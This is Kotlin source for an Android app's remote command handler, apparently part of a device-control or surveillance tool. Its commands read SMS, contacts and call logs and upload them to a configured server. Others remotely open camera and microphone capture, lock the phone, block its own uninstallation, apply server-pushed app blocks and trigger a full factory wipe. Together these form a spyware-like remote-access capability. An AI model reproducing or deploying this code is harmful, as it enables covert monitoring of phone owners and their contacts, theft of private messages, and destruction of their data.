package com.misfit.gawdzilla

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Settings
import org.json.JSONObject

object Commands {

    // Friendly aliases → (package, optional explicit action)
    private val ALIASES: Map<String, Pair<String, String?>> = mapOf(
        "settings"  to ("com.android.settings" to "android.settings.SETTINGS"),
        "wifi"      to ("com.android.settings" to "android.settings.WIFI_SETTINGS"),
        "bluetooth" to ("com.android.settings" to "android.settings.BLUETOOTH_SETTINGS"),
        "battery"   to ("com.android.settings" to "android.settings.BATTERY_SAVER_SETTINGS"),
        "apps"      to ("com.android.settings" to "android.settings.APPLICATION_SETTINGS"),
        "camera"    to ("com.android.camera"  to null),
        "chrome"    to ("com.android.chrome"  to null),
        "play"      to ("com.android.vending" to null),
        "youtube"   to ("com.google.android.youtube" to null),
        "gmail"     to ("com.google.android.gm" to null),
        "maps"      to ("com.google.android.apps.maps" to null),
    )

    fun run(ctx: Context, rawCmd: String, rawPayload: String): Pair<Boolean, String> {
        val trimmed = (rawCmd ?: "").trim()
        val cmd: String
        val payload: String

        val space = trimmed.indexOf(' ')
        if (space > 0 && rawPayload.isBlank()) {
            cmd = trimmed.substring(0, space).lowercase()
            payload = trimmed.substring(space + 1).trim()
        } else {
            cmd = trimmed.lowercase()
            payload = rawPayload.trim()
        }

        return when (cmd) {
            "ping" -> true to "pong"

            "lock" -> {
                try {
                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = ComponentName(ctx, DeviceAdminReceiver::class.java)
                    if (!dpm.isAdminActive(admin)) false to "device admin not active"
                    else { dpm.lockNow(); true to "locked" }
                } catch (e: Exception) { false to "lock failed: ${e.message}" }
            }

            "open_url" -> {
                if (payload.isBlank()) false to "open_url requires a URL payload"
                else try {
                    val i = Intent(Intent.ACTION_VIEW, Uri.parse(payload)).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    ctx.startActivity(i)
                    true to "sent intent for $payload"
                } catch (e: Exception) { false to "open failed: ${e.message}" }
            }

            "launch" -> launchApp(ctx, payload)

            "sysinfo" -> true to SysInfo.collect(ctx).toString()
            "usage"   -> true to UsageReader.collect(ctx).toString()

            "sms" -> {
                val arr = SmsReader.collect(ctx)
                val s = Prefs.serverUrl(ctx); val t = Prefs.enrollToken(ctx)
                if (s.isNotBlank() && t.isNotBlank()) ApiClient.postSms(s, t, arr)
                true to "sms: ${arr.length()} entries"
            }

            "contacts" -> {
                val arr = ContactsReader.collect(ctx)
                val s = Prefs.serverUrl(ctx); val t = Prefs.enrollToken(ctx)
                if (s.isNotBlank() && t.isNotBlank()) ApiClient.postContacts(s, t, arr)
                true to "contacts: ${arr.length()} entries"
            }

            "call_log" -> {
                val arr = CallLogReader.collect(ctx)
                val s = Prefs.serverUrl(ctx); val t = Prefs.enrollToken(ctx)
                if (s.isNotBlank() && t.isNotBlank()) ApiClient.postCallLog(s, t, arr)
                true to "call_log: ${arr.length()} entries"
            }

            "camera" -> {
                try {
                    ctx.startActivity(Intent(ctx, CameraCaptureActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    })
                    true to "camera activity launched"
                } catch (e: Exception) { false to "camera failed: ${e.message}" }
            }

            "mic" -> {
                try {
                    ctx.startActivity(Intent(ctx, MicCaptureActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    })
                    true to "mic activity launched"
                } catch (e: Exception) { false to "mic failed: ${e.message}" }
            }

            "settings" -> launchApp(ctx, "settings")

            "screenshot" -> false to "screenshot not supported on Android 10+ without MediaProjection consent"

            "policy_sync" -> {
                try {
                    val server = Prefs.serverUrl(ctx); val token = Prefs.enrollToken(ctx)
                    if (server.isBlank() || token.isBlank()) false to "not configured"
                    else {
                        val p = ApiClient.fetchPolicy(server, token)
                        if (p == null) false to "policy fetch failed"
                        else {
                            val policies = p.optJSONArray("policies")
                            if (policies != null && policies.length() > 0) {
                                val cfg = policies.getJSONObject(0).optJSONObject("config") ?: JSONObject()
                                PolicyEngine.apply(ctx, cfg)
                            }
                            val rules = p.optJSONArray("app_rules")
                            if (rules != null) {
                                val list = ArrayList<Pair<String, String>>()
                                for (i in 0 until rules.length()) {
                                    val r = rules.getJSONObject(i)
                                    list.add(r.optString("package") to r.optString("action"))
                                }
                                PolicyEngine.applyAppRules(ctx, list)
                            }
                            true to "policy applied"
                        }
                    }
                } catch (e: Exception) { false to "policy error: ${e.message}" }
            }

            "app_block" -> {
                if (payload.isBlank()) false to "app_block requires payload: pkg:block|unblock"
                else {
                    val parts = payload.split(":", limit = 2)
                    if (parts.size < 2) false to "payload must be pkg:block|unblock"
                    else {
                        val pkg = parts[0].trim()
                        val action = if (parts[1].trim() == "unblock") "allow" else "block"
                        PolicyEngine.applyAppRules(ctx, arrayListOf(pkg to action))
                        true to "app_block applied $pkg=$action"
                    }
                }
            }

            "block_uninstall" -> {
                try {
                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = ComponentName(ctx, DeviceAdminReceiver::class.java)
                    if (!dpm.isDeviceOwnerApp(ctx.packageName)) false to "not device owner"
                    else {
                        dpm.setUninstallBlocked(admin, payload.ifBlank { ctx.packageName }, true)
                        true to "uninstall blocked"
                    }
                } catch (e: Exception) { false to "block_uninstall failed: ${e.message}" }
            }

            "unblock_uninstall" -> {
                try {
                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = ComponentName(ctx, DeviceAdminReceiver::class.java)
                    if (!dpm.isDeviceOwnerApp(ctx.packageName)) false to "not device owner"
                    else {
                        dpm.setUninstallBlocked(admin, payload.ifBlank { ctx.packageName }, false)
                        true to "uninstall unblocked"
                    }
                } catch (e: Exception) { false to "unblock_uninstall failed: ${e.message}" }
            }

            "device_owner_status" -> {
                try {
                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = ComponentName(ctx, DeviceAdminReceiver::class.java)
                    val o = JSONObject()
                    o.put("is_device_owner", dpm.isDeviceOwnerApp(ctx.packageName))
                    o.put("is_admin", dpm.isAdminActive(admin))
                    o.put("uninstall_blocked", dpm.isUninstallBlocked(admin, ctx.packageName))
                    true to o.toString()
                } catch (e: Exception) { false to "status failed: ${e.message}" }
            }

            "wipe_data" -> {
                try {
                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    if (!dpm.isDeviceOwnerApp(ctx.packageName)) false to "not device owner — wipe refused"
                    else { dpm.wipeData(0); true to "wipe initiated" }
                } catch (e: Exception) { false to "wipe failed: ${e.message}" }
            }

            "wipe_cache" -> {
                try { ctx.cacheDir.deleteRecursively(); true to "cache cleared" }
                catch (e: Exception) { false to "wipe failed: ${e.message}" }
            }

            "installed_count" -> {
                try {
                    val n = ctx.packageManager.getInstalledApplications(0).size
                    true to "installed apps: $n"
                } catch (e: Exception) { false to "count failed: ${e.message}" }
            }

            "find_app" -> {
                if (payload.isBlank()) false to "find_app requires a query payload"
                else {
                    try {
                        val pm = ctx.packageManager
                        val q = payload.lowercase()
                        val intent = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER)
                        val apps = pm.queryIntentActivities(intent, 0)
                        val arr = org.json.JSONArray()
                        for (ai in apps) {
                            val pkg = ai.activityInfo.packageName
                            if (pkg.lowercase().contains(q)) {
                                val o = JSONObject()
                                o.put("package", pkg)
                                o.put("label", ai.loadLabel(pm).toString())
                                arr.put(o)
                                if (arr.length() >= 20) break
                            }
                        }
                        true to "find_app '$payload': ${arr.length()} match(es)\n${arr}"
                    } catch (e: Exception) { false to "find failed: ${e.message}" }
                }
            }

            else -> false to "unknown command: $cmd"
        }
    }

    // ─────────────────────────────────────────────────────────────
    //  Launch helper — 3-layer fallback for Xiaomi / HyperOS
    // ─────────────────────────────────────────────────────────────
    private fun launchApp(ctx: Context, rawPayload: String): Pair<Boolean, String> {
        val payload = rawPayload.trim()
        if (payload.isBlank()) return false to "launch requires a package name or alias"

        // 1. Alias expansion
        val lowered = payload.lowercase()
        val (pkg, explicitAction) = ALIASES[lowered] ?: (payload to null)

        // 2. Try explicit action first (most reliable for Settings sub-pages)
        if (explicitAction != null) {
            try {
                val i = Intent(explicitAction).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                ctx.startActivity(i)
                return true to "launched $explicitAction"
            } catch (_: Exception) { /* fall through */ }
        }

        // 3. Try getLaunchIntentForPackage
        try {
            val li = ctx.packageManager.getLaunchIntentForPackage(pkg)
            if (li != null) {
                li.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(li)
                return true to "launched $pkg"
            }
        } catch (_: Exception) { /* fall through */ }

        // 4. Manual ACTION_MAIN + CATEGORY_LAUNCHER + setPackage (works on Xiaomi)
        try {
            val i = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_LAUNCHER)
                setPackage(pkg)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            ctx.startActivity(i)
            return true to "launched $pkg (manual intent)"
        } catch (_: Exception) { /* fall through */ }

        // 5. Settings special-case — always available via system intent
        if (lowered == "settings" || pkg == "com.android.settings") {
            try {
                val i = Intent(android.provider.Settings.ACTION_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                ctx.startActivity(i)
                return true to "launched settings (system action)"
            } catch (_: Exception) {}
        }

        return false to "could not launch $pkg — package may not expose a launcher activity"
    }
}
